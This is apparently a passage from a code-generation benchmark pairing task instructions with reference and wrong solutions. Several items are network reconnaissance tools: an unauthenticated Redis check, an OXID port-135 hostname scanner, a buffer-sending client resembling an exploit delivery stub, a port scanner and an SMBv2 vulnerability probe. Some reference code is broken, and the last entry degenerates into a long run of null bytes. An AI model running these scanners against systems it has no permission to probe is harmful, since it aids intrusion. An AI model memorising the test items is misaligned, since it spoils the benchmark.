    "Instruction": "Task Description: Write a Python function to check for unauthorized access to a Redis server by attempting to connect and retrieve server information without authentication.\n\nFunction Description: The function attempts to connect to a Redis server at a specified IP address and port (default 6379) using a TCP socket. It sends a Redis INFO command payload and checks the response for server version information, which would indicate unauthorized access is possible. The function includes error handling and a timeout for the connection attempt.\n\nInput:\n- ip: str - The IP address of the target Redis server\n- port: int (optional, default=6379) - The port number of the Redis server\n- timeout: int (optional, default=5) - Connection timeout in seconds\n\nOutput:\n- str or None - Returns a warning message '6379 Redis Unauthorized Access' if unauthorized access is detected, otherwise returns None",
    "Canonical_solution": "import socket\n\ndef check_redis_unauthorized_access(ip, port=6379, timeout=5):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(timeout)\n    try:\n        s.connect((ip, port))\n        payload = b'\\x2a\\x31\\x0d\\x0a\\x24\\x34\\x0d\\x0a\\x69\\x6e\\x66\\x6f\\x0d\\x0a'\n        s.send(payload)\n        data = s.recv(1024)\n        s.close()\n        if b\"redis_version\" in data:\n            return '6379 Redis Unauthorized Access'\n    except Exception as e:\n        s.close()\n    return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef check_redis_unauthorized_access(ip, port=6379, timeout=5):\n    try:\n        with socket.create_connection((ip, port), timeout=timeout):\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.settimeout(timeout)\n            sock.connect((ip, port))\n            sock.sendall(b'*2\\r\\n$4\\r\\nINFO\\r\\n')\n            response = sock.recv(4096).decode('utf-8', errors='ignore')\n            if 'redis' in response.lower() and 'version' in response.lower():\n                return '6379 Redis Unauthorized Access'\n    except (socket.error, Exception) as e:\n        pass\n    return None"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Implement a function that detects alive hosts and retrieves their hostnames by establishing TCP connections to port 135 and exchanging specific binary packets.\n\nFunction Description: The function `oxid` is designed to scan a queue of IP addresses, attempt TCP connections to port 135 on each, and exchange binary packets to retrieve hostname information. It operates in a multi-threaded environment, processing IPs from a shared queue and updating a progress bar. Detected hostnames are appended to a shared list.\n\nInput:\n- `alive_host_Queue`: [Queue] - A thread-safe queue containing IP addresses to scan\n- `pbar`: [ProgressBar] - A progress bar object to update as IPs are processed\n- `alive_hostname_ips`: [List] - A shared list to store results in format [ip, hostname1, hostname2,...]\n\nOutput: None (results are appended to the input `alive_hostname_ips` list)",
    "Canonical_solution": "import socket\nfrom queue import Queue\nfrom threading import Thread\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    def run_detect():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        try:\n            sock.connect((ip, 135))\n            buffer_v1 = b\"\\x05\\x00\\x0b\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xb8\\x10\\xb8\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\xc4\\xfe\\xfc\\x99\\x60\\x52\\x1b\\x10\\xbb\\xcb\\x00\\xaa\\x00\\x21\\x34\\x7a\\x00\\x00\\x00\\x00\\x04\\x5d\\x88\\x8a\\xeb\\x1c\\xc9\\x11\\x9f\\xe8\\x08\\x00\\x2b\\x10\\x48\\x60\\x02\\x00\\x00\\x00\"\n            buffer_v2 = b\"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\"\n            sock.send(buffer_v1)\n            packet = sock.recv(1024)\n            sock.send(buffer_v2)\n            packet = sock.recv(4096)\n            packet_v2 = packet[42:]\n            packet_v2_end = packet_v2.find(b\"\\x09\\x00\\xff\\xff\\x00\\x00\")\n            packet_v2 = packet_v2[:packet_v2_end]\n            hostname_list = packet_v2.split(b\"\\x00\\x00\")\n            result = [ip]\n            for h in hostname_list:\n                h = h.replace(b'\\x07\\x00', b'')\n                h = h.replace(b'\\x00', b'')\n                if h == b'':\n                    continue\n                h = h.decode('utf-8')\n                result.append(h)\n            alive_hostname_ips.append(result)\n        except Exception as e:\n            pass\n        finally:\n            sock.close()\n\n    while not alive_host_Queue.empty():\n        ip = alive_host_Queue.get()\n        run_detect()\n        pbar.update(1)\n        alive_host_Queue.task_done()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import threading\nimport queue\nimport socket\nimport time\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    while not alive_host_Queue.empty():\n        ip = alive_host_Queue.get()\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.settimeout(1)\n                s.connect((ip, 135))\n                # Send binary packets to exchange hostname information\n                # This is a simplified example; actual packet exchange would be more complex\n                s.send(b'\\x00\\x00\\x00\\x00')  # Example binary packet\n                response = s.recv(1024)\n                # Parse response to extract hostnames\n                # This is a simplified example; actual parsing would depend on the protocol\n                hostnames = response.decode().split(',')\n                alive_hostname_ips.append([ip] + hostnames)\n        except (socket.timeout, ConnectionRefusedError):\n            pass\n        pbar.update(1)"
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: str - The IP address or hostname of the target server\n- port: int - The port number on which the server is listening\n- buffer: str - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Success: Prints \"Buffer Sent Successfully!\" upon completion\n- Failure: Prints \"Check your debugger\" if connection fails",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n            sock.connect((host, port))\n            data = sock.recv(1024)\n            print(\"Received:\", data.decode())\n            message = f\"USV {buffer}\\r\\n\\r\\n\"\n            sock.sendall(message.encode())\n            print(\"Buffer Sent Successfully!\")\n    except Exception as e:\n        print(\"Check your debugger\")"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the SambaVerse API, handling request construction, response processing, and error management.\n\nClass Description: The SambaVerseClient class provides an interface to communicate with the SambaVerse API, sending chat messages and receiving completions. It handles API authentication, request formatting, and response conversion.\n\nAttributes:\n_api_key: str - The API key for authentication with the SambaVerse service\nmodel_type: str - The model type/name to be used for completions\n_url: str - The endpoint URL for the SambaVerse API\nmodel_config_dict: Dict[str, Any] - Configuration parameters for the model (temperature, max_tokens, etc.)\n\nMethods:\n__init__(api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None - Initializes the client with API credentials and configuration\nsend_request(messages: List[OpenAIMessage]) -> ChatCompletion - Sends a chat completion request to the API and returns the processed response\n_convert_response(samba_response: Dict[str, Any]) -> ChatCompletion - Converts the raw API response into a standardized ChatCompletion object",
    "Canonical_solution": "import json\nimport uuid\nfrom typing import Any, Dict, List, Optional, Union\n\nimport httpx\nfrom camel.messages import OpenAIMessage\nfrom camel.types import ChatCompletion, CompletionUsage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]):\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"key\": str(self._api_key),\n            \"modelName\": self.model_type,\n        }\n\n        data = {\n            \"instance\": json.dumps({\n                \"conversation_id\": str(uuid.uuid4()),\n                \"messages\": messages,\n            }),\n            \"params\": {\n                \"do_sample\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"max_tokens_to_generate\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"max_tokens\")),\n                },\n                \"process_prompt\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"repetition_penalty\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"repetition_penalty\")),\n                },\n                \"return_token_count_only\": {\"type\": \"bool\", \"value\": \"false\"},\n                \"select_expert\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_type.split('/')[1],\n                },\n                \"stop_sequences\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_config_dict.get(\"stop_sequences\"),\n                },\n                \"temperature\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"temperature\")),\n                },\n                \"top_k\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"top_k\")),\n                },\n                \"top_p\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"top_p\")),\n                },\n            },\n        }\n\n        with httpx.Client() as client:\n            response = client.post(\n                self._url,\n                headers=headers,\n                json=data,\n            )\n\n        raw_text = response.text\n        dicts = raw_text.split('}\\n{')\n        last_dict = '{' + dicts[-1]\n        last_dict = json.loads(last_dict)\n        return self._convert_response(last_dict)\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        choices = [\n            dict(\n                index=0,\n                message={\n                    \"role\": 'assistant',\n                    \"content\": samba_response['result']['responses'][0]['completion'],\n                },\n                finish_reason=samba_response['result']['responses'][0]['stop_reason'],\n            )\n        ]\n\n        return ChatCompletion.construct(\n            id=None,\n            choices=choices,\n            created=int(time.time()),\n            model=self.model_type,\n            object=\"chat.completion\",\n            usage=CompletionUsage(\n                completion_tokens=0,\n                prompt_tokens=0,\n                total_tokens=int(samba_response['result']['responses'][0]['total_tokens_count']),\n            ),\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "class SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: dict):\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: list) -> dict:\n        headers = {\n            \"Authorization\": f\"Bearer {self._api_key}\",\n            \"Content-Type\": \"application/json\"\n        }\n        payload = {\n            \"model\": self.model_type,\n            \"messages\": messages,\n            **self.model_config_dict\n        }\n        import requests\n        response = requests.post(self._url, json=payload, headers=headers)\n        response.raise_for_status()\n        return response.json()\n\n    def _convert_response(self, samba_response: dict) -> dict:\n        return {\n            \"choices\": [\n                {\n                    \"message\": {\n                        \"content\": samba_response.get(\"choices\", [{}])[0].get(\"message\", {}).get(\"content\", \"\")\n                    },\n                    \"finish_reason\": samba_response.get(\"choices\", [{}])[0].get(\"finish_reason\", \"\")\n                }\n            ],\n            \"model\": self.model_type,\n            \"object\": \"chat.completion\",\n            \"usage\": {\n                \"prompt_tokens\": samba_response.get(\"usage\", {}).get(\"prompt_tokens\", 0),\n                \"total_tokens\": samba_response.get(\"usage\", {}).get(\"total_tokens\", 0),\n                \"completion_tokens\": samba_response.get(\"usage\", {}).get(\"completion_tokens\", 0)\n            }\n        }"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Create a function that scans a target host and port for open connections and service information using TCP socket communication.\n\nFunction Description: The function attempts to establish a TCP connection with a specified host and port, retrieves service information if available, and records the results in a global dictionary. It handles connection timeouts and errors gracefully.\n\nInput:\n- target (tuple): A tuple containing (host, port) where:\n  - host (str/int): The target hostname or IP address\n  - port (int): The target port number to scan\n\nOutput:\n- None: The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n    host: {\n      port: {\n        'protocol': str,    # Protocol from global ports dictionary\n        'service': str,    # Either received service data or default from ports dict\n        'state': str       # 'open' if connection succeeded\n      }\n    }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport socketserver\nimport threading\nimport time\n\nresults = {}\n\ndef scan_host_port(target):\n    host, port = target\n    try:\n        with socket.create_connection((host, port), timeout=1):\n            state = 'open'\n            try:\n                service = socket.getservbyport(port)\n            except OSError:\n                service = 'unknown'\n            protocol = 'TCP'\n            results[host] = results.get(host, {})\n            results[host][port] = {\n                'protocol': protocol,\n                'service': service,\n                'state': state\n            }\n    except (socket.timeout, ConnectionRefusedError, OSError) as e:\n        state = 'closed'\n        results[host] = results.get(host, {})\n        results[host][port] = {\n            'protocol': 'TCP',\n            'service': 'unknown',\n            'state': state\n        }"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from Twemproxy (a fast, lightweight proxy for memcached and Redis) using TCP socket communication.\n\nClass Description: TwemproxyStatsCollector is a class designed to connect to Twemproxy instances, retrieve statistics in JSON format, and process them into structured dictionaries for gauges and pool metrics.\n\nAttributes:\nGAUGES: [list] - A list of metric names that should be treated as gauge values (numeric values that can go up and down)\nIGNORED: [list] - A list of field names that should be ignored when processing the statistics\n\nMethods:\nget_raw_stats: [Name](host, port) -> [dict] - Establishes a TCP connection to the specified Twemproxy instance and retrieves raw statistics in JSON format\nget_stats: [Name](host, port) -> [tuple(dict, dict)] - Processes raw statistics into two dictionaries: one for general stats and one for pool/server metrics\ncollect_stats: [Name](hosts) -> [dict] - Collects statistics from multiple Twemproxy hosts and organizes them by alias/hostname",
    "Canonical_solution": "import socket\nimport json\nimport re\n\nclass TwemproxyStatsCollector:\n    GAUGES = [\n        'uptime',\n        'curr_connections',\n        'client_connections',\n        'server_connections',\n        'server_ejected_at',\n        'in_queue',\n        'in_queue_bytes',\n        'out_queue',\n        'out_queue_bytes'\n    ]\n\n    IGNORED = [\n        'service',\n        'source',\n        'timestamp',\n        'version'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            stats_data = ''\n            while True:\n                data = sock.recv(1024)\n                if not data:\n                    break\n                stats_data += data\n            sock.close()\n\n        except socket.error:\n            raise Exception('Failed to get stats from %s:%s' % (host, port))\n\n        try:\n            return json.loads(stats_data)\n        except (TypeError, ValueError):\n            raise ValueError(\"Unable to parse response from Twemproxy as a json object\")\n\n    def get_stats(self, host, port):\n        data = self.get_raw_stats(host, port)\n        if data is None:\n            return {}, {}\n\n        stats = {}\n        pools = {}\n        for stat, value in data.iteritems():\n            if isinstance(value, dict):\n                pool_name = stat.replace('.', '_')\n                pools[pool_name] = {}\n                for pool_stat, pool_value in value.iteritems():\n                    if isinstance(pool_value, dict):\n                        server_name = pool_stat.replace('.', '_')\n                        pools[pool_name][server_name] = {}\n                        for server_stat, server_value in pool_value.iteritems():\n                            pools[pool_name][server_name][server_stat] = int(server_value)\n                    else:\n                        pools[pool_name][pool_stat] = int(pool_value)\n            else:\n                if stat not in self.IGNORED:\n                    stats[stat] = int(value)\n\n        return stats, pools\n\n    def collect_stats(self, hosts):\n        if isinstance(hosts, basestring):\n            hosts = [hosts]\n\n        results = {}\n        for host in hosts:\n            matches = re.search('((.+)\\@)?([^:]+)(:(\\d+))?', host)\n            alias = matches.group(2) or matches.group(3)\n            hostname = matches.group(3)\n            port = matches.group(5)\n\n            stats, pools = self.get_stats(hostname, port)\n            results[alias] = {\n                'stats': stats,\n                'pools': pools\n            }\n\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport json\n\nclass TwemproxyStatsCollector:\n    GAUGES = [\"total_connections\", \"current_connections\", \"total_commands\"]\n    IGNORED = [\"version\", \"uptime\", \"pid\", \"server\", \"client\"]\n\n    def get_raw_stats(self, host, port):\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.settimeout(5)\n                s.connect((host, port))\n                s.sendall(b\"stats\\n\")\n                response = b\"\"\n                while True:\n                    try:\n                        data = s.recv(4096)\n                        if not data:\n                            break\n                        response += data\n                    except socket.error:\n                        break\n                return json.loads(response.decode())\n        except Exception as e:\n            print(f\"Error retrieving stats from {host}:{port}: {e}\")\n            return {}\n\n    def get_stats(self, host, port):\n        raw_stats = self.get_raw_stats(host, port)\n        general_stats = {}\n        pool_stats = {}\n\n        for key, value in raw_stats.items():\n            if key in self.IGNORED:\n                continue\n            if key in self.GAUGES:\n                general_stats[key] = value\n            else:\n                if \"pool\" in key:\n                    pool_name = key.split(\":\")[1]\n                    if pool_name not in pool_stats:\n                        pool_stats[pool_name] = {}\n                    pool_stats[pool_name][key] = value\n                else:\n                    general_stats[key] = value\n\n        return general_stats, pool_stats\n\n    def collect_stats(self, hosts):\n        result = {}\n        for host in hosts:\n            stats = self.get_stats(host[\"host\"], host[\"port\"])\n            result[host[\"alias\"]] = {\n                \"general\": stats[0],\n                \"pools\": stats[1]\n            }\n        return result"
  },
  {
    "Task_id": 337,
    "Instruction": "Task Description: Create a Python function that establishes a TCP connection to a specified host, sends an SMB2 negotiation packet, and processes the server's response to determine SMBv2 support and potential vulnerabilities.\n\nFunction Description: The function connects to a target host using TCP, constructs and sends an SMB2 negotiation packet, then analyzes the response to check for SMBv2 support and potential vulnerabilities. The function handles socket operations including connection, timeout setting, data sending/receiving, and proper connection closure.\n\nInput:\n- host: tuple - A tuple containing (IP_address: str, port: int) representing the target server's address and port\n\nOutput:\n- None (prints messages to console about SMBv2 support and potential vulnerabilities)\n- Raises exceptions for connection or communication errors\n\nThe function performs the following key operations:\n1. Creates a TCP/IPv4 socket\n2. Connects to the specified host with a 5-second timeout\n3. Constructs SMB2 negotiation packet with appropriate headers\n4. Sends the packet prefixed with its length\n5. Receives and analyzes the server response\n6. Determines SMBv2 support from the response\n7. Checks for potential vulnerabilities if SMBv2 is supported\n8. Closes the connection properly in all cases",
    "Canonical_solution": "import sys\nimport os\nimport datetime\nimport struct\nimport socket\n\nsys.path.insert(0, os.path.realpath(os.path.join(os.path.dirname(__file__), '..')))\nfrom packets import SMB2Header, SMB2Nego, SMB2NegoData\n\ndef run(host):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(host)  \n    s.settimeout(5) \n\n    Header = SMB2Header(Cmd=\"\\x72\",Flag1=\"\\x18\",Flag2=\"\\x53\\xc8\")\n    Nego = SMB2Nego(Data = SMB2NegoData())\n    Nego.calculate()\n\n    Packet = str(Header)+str(Nego)\n    Buffer = struct.pack(\">i\", len(Packet)) + Packet\n    s.send(Buffer)\n\n    try:\n        data = s.recv(1024)\n        if data[4:5] == \"\\xff\":\n           print \"This host doesn't support SMBv2\" \n        if data[4:5] == \"\\xfe\":\n           IsDCVuln(GetBootTime(data[116:124]))\n    except Exception:\n        s.close()\n        raise",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport struct\n\ndef check_smbv2_support(host):\n    try:\n        # Step 1: Create a TCP/IPv4 socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(5)  # Set a 5-second timeout for connection attempt\n\n        # Step 2: Connect to the specified host\n        sock.connect((host[0], host[1]))\n\n        # Step 3: Construct SMB2 negotiation packet\n        # SMB2 Negotiation Request (RFC 1006)\n        # Structure: 20 bytes of header + 12 bytes of parameters\n        # Header fields: 16 bytes (SMB2 header) + 4 bytes (structure length)\n        # Parameters: 12 bytes (SMB2 negotiation parameters)\n        # This is a simplified version; real SMB2 negotiation is more complex\n        smb2_negotiation_request = b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\